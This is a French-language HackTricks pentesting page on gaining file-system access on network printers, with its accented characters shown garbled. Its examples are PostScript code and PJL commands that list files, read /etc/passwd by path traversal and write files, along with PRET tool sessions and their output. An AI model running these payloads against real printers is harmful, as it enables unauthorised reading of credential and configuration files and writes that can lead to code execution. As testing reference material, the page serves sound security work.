<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Travaillez-vous dans une entreprise de cybersÃ©curitÃ©? Voulez-vous voir votre entreprise annoncÃ©e dans HackTricks? ou voulez-vous avoir accÃ¨s Ã  la derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!

- DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR aux rÃ©fÃ©rentiels [hacktricks](https://github.com/carlospolop/hacktricks) et [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


## **PostScript**

RÃ©cupÃ©rez des informations sensibles telles que des fichiers de configuration ou des travaux d'impression stockÃ©s, RCE en Ã©crivant des fichiers (comme l'Ã©dition de scripts rc ou le remplacement de fichiers binaires). Des constructions de langage lÃ©gitimes sont dÃ©finies pour **PostScript** et **PJL** pour **accÃ©der au systÃ¨me de fichiers**.

AccÃ©dez au systÃ¨me de fichiers avec PostScript (notez qu'il peut Ãªtre sandboxÃ© en limitant les actions inoffensives):
```bash
> /str 256 string def (%*%../*)                               % list all files
> {==} str filenameforall
< (%disk0%../webServer/home/device.html)
< (%disk0%../webServer/.java.login.config)
< (%disk0%../webServer/config/soe.xml)

> /byte (0) def                                                % read from file
> /infile (../../../etc/passwd) (r) file def
> { infile read {byte exch 0 exch put
>   (%stdout) (w) file byte writestring}
>   {infile closefile exit} ifelse
> } loop
< root::0:0::/:/bin/dlsh

> /outfile (test.txt) (w+) file def}}                         % write to file
> outfile (Hello World!) writestring
> outfile closefile
```
Vous pouvez utiliser les commandes [PRET](https://github.com/RUB-NDS/PRET) suivantes : `ls`, `get`, `put`, `append`, `delete`, `rename`, `find`, `mirror`, `touch`, `mkdir`, `cd`, `pwd`, `chvol`, `traversal`, `format`, `fuzz` et `df` :
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> ls ../..
d        -   Jan  1  1970 (created Jan  1  1970)  bootdev
d        -   Jan  1  1970 (created Jan  1  1970)  dsk_jdi
d        -   Jan  1  1970 (created Jan  1  1970)  dsk_jdi_ss
d        -   Jan  1  1970 (created Jan  1  1970)  dsk_ram0
d        -   Jan  1  1970 (created Jan  1  1970)  etc
d        -   Jan  1  1970 (created Jan  1  1970)  tmp
d        -   Jan  1  1970 (created Jan  1  1970)  webServer
```
## PJL

PJL (Printer Job Language) est un langage de commande utilisÃ© pour contrÃ´ler les imprimantes. Il est utilisÃ© pour configurer les paramÃ¨tres de l'imprimante, envoyer des commandes d'impression et rÃ©cupÃ©rer des informations sur l'Ã©tat de l'imprimante. Les commandes PJL sont envoyÃ©es Ã  l'imprimante via le port TCP 9100.

Les commandes PJL sont gÃ©nÃ©ralement utilisÃ©es pour configurer les paramÃ¨tres de l'imprimante, telles que la qualitÃ© d'impression, la rÃ©solution et le format de papier. Cependant, certaines commandes PJL peuvent Ã©galement Ãªtre utilisÃ©es pour accÃ©der au systÃ¨me de fichiers de l'imprimante.

L'une des commandes PJL les plus couramment utilisÃ©es pour accÃ©der au systÃ¨me de fichiers de l'imprimante est la commande "FSUPLOAD". Cette commande permet de tÃ©lÃ©charger des fichiers depuis l'imprimante vers un ordinateur distant. Il est Ã©galement possible d'utiliser la commande "FSQUERY" pour interroger l'imprimante sur les fichiers stockÃ©s sur son systÃ¨me de fichiers.

Il est important de noter que l'accÃ¨s au systÃ¨me de fichiers de l'imprimante via PJL peut Ãªtre restreint par des mesures de sÃ©curitÃ© telles que l'authentification et l'autorisation. Cependant, si ces mesures ne sont pas correctement mises en place, un attaquant peut potentiellement accÃ©der aux fichiers sensibles stockÃ©s sur l'imprimante.
```
> @PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535               (list all files)
< .\:\:TYPE=DIR
< ..\:\:TYPE=DIR
< PostScript TYPE=DIR
< PJL TYPE=DIR
< saveDevice TYPE=DIR
< webServer TYPE=DIR

> @PJL FSQUERY NAME="0:\..\..\etc\passwd"                     (read from file)
< @PJL FSQUERY NAME="0:\..\..\etc\passwd" TYPE=FILE SIZE=23
> @PJL FSUPLOAD NAME="0:\..\..\etc\passwd" OFFSET=0 SIZE=23
< root::0:0::/:/bin/dlsh

> @PJL FSDOWNLOAD SIZE=13 NAME="0:\test.txt"                  (write to file)
> Hello World!
```
De toute faÃ§on, l'accÃ¨s aux fichiers avec PJL n'est pas pris en charge par de nombreux imprimantes.

Vous pouvez utiliser les commandes [PRET](https://github.com/RUB-NDS/PRET) : `ls`, `get`, `put`, `append`, `delete`, `find`, `mirror`, `touch`, `mkdir`, `cd`, `pwd`, `chvol`, `traversal`, `format`, `fuzz` et `df` :
```
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> ls ..
d        -   bootdev
d        -   dsk_jdi
d        -   dsk_jdi_ss
d        -   dsk_ram0
d        -   etc
d        -   lrt
d        -   tmp
d        -   webServer
d        -   xps
```
En savoir plus sur les possibles contournements de sandbox en utilisant les limitations PostScript et PJL dans [http://hacking-printers.net/wiki/index.php/File\_system\_access](http://hacking-printers.net/wiki/index.php/File\_system\_access)
